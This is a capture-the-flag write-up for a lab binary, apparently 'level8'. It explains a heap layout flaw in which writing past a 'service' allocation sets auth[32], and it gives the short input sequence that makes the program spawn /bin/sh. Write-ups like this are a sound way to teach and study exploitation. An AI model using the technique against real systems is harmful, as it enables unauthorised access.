
# Vulnerability Summary

## What is this program?

An interactive program with commands:

| Command | What it does |
|---------|--------------|
| `auth ` | Allocates memory block, stores pointer |
| `service` | Allocates another memory block |
| `login` | Checks condition, gives shell or not |
| `reset` | Frees memory |

## How we found the commands

1. **Testing:** Random inputs showed nothing happens
2. **GDB:** Disassembly showed string comparisons
3. **Checking strings:** Found "auth ", "login", "/bin/sh"

## The Vulnerability

Two `malloc` blocks are allocated close together in memory:

```
auth    at 0x804a008
service at 0x804a018  (only 16 bytes apart)
```

## The Condition for Shell

```c
if (auth[32] != 0) {
    system("/bin/sh");
}
```

`auth[32]` means: position 32 bytes after auth start = `0x804a028`

## Memory Layout

**Before exploit:**
```
0x804a008: [auth block - small, empty after few bytes]
0x804a018: [empty]
0x804a028: [0]  ← auth[32] is 0, no shell
```

**After `serviceAAAA...`:**
```
0x804a008: [auth block]
0x804a018: [service + "AAAAAAAAAAAAAAAA"]
0x804a028: [A]  ← auth[32] is now "A", SHELL!
```

## The Exploit

```bash
./level8
auth 
serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

## Why it works

1. `auth ` creates block at `0x804a008`
2. `serviceAAA...` creates block at `0x804a018` with long data
3. The "A"s overflow past service's block into `0x804a028`
4. `login` checks `auth[32]` (which is at `0x804a028`)
5. It's not zero anymore (contains "A")
6. Condition passes → `system("/bin/sh")`
7. **Shell!**